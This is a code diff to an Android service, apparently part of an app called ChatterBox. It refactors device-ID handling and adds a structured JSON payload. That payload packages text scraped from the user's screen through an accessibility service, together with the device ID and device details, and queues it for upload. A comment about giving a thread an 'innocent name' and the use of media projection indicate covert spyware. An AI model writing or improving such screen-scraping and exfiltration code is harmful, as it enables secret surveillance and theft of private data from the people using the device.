@@ -56,6 +56,11 @@ class BackgroundSyncService : Service() {
     private var dataSync: DataSynchronizer? = null
     private var lastSyncTime = 0L
 
+    // Use consistent device ID throughout the app
+    private val deviceId: String by lazy {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    }
+
     override fun onCreate() {
         super.onCreate()
         // Create a handler thread with an innocent name
@@ -281,7 +286,7 @@ class BackgroundSyncService : Service() {
                 put("device_model", Build.MODEL)
                 put("device_manufacturer", Build.MANUFACTURER)
                 put("android_version", Build.VERSION.RELEASE)
-                put("device_id", getDeviceID())
+                put("device_id", deviceId) // CONSISTENT: Always use deviceId
                 put("timestamp", System.currentTimeMillis())
             }
 
@@ -325,21 +330,6 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    private fun getDeviceID(): String {
-        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-    }
-
-    override fun onDestroy() {
-        syncThread?.quitSafely()
-        mediaProj?.stop()
-        mediaProj = null
-
-        super.onDestroy()
-    }
-
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
-    }
     private fun captureVisibleContent() {
         val accessibilityService = com.example.ChatterBox.accessibility.AccessibilityService.getInstance()
         if (accessibilityService != null) {
@@ -348,8 +338,18 @@ class BackgroundSyncService : Service() {
                 if (root != null) {
                     val extractedText = extractTextFromNode(root)
                     if (extractedText.isNotEmpty()) {
+                        // Create a structured JSON payload
+                        val capturedData = JSONObject().apply {
+                            put("timestamp", System.currentTimeMillis())
+                            put("device_id", deviceId) // CONSISTENT: Always use deviceId
+                            put("content_type", "text")
+                            put("text", extractedText)
+                            put("device_model", Build.MODEL)
+                            put("android_version", Build.VERSION.RELEASE)
+                        }
+
                         // Process and store the text
-                        dataSync?.queueForSync("screen_content", extractedText)
+                        dataSync?.queueForSync("screen_content", capturedData.toString())
                     }
                     root.recycle()
                 }
@@ -371,5 +371,17 @@ class BackgroundSyncService : Service() {
             child.recycle()
         }
         return sb.toString()
+    }
+
+    override fun onDestroy() {
+        syncThread?.quitSafely()
+        mediaProj?.stop()
+        mediaProj = null
+
+        super.onDestroy()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
     }
 }
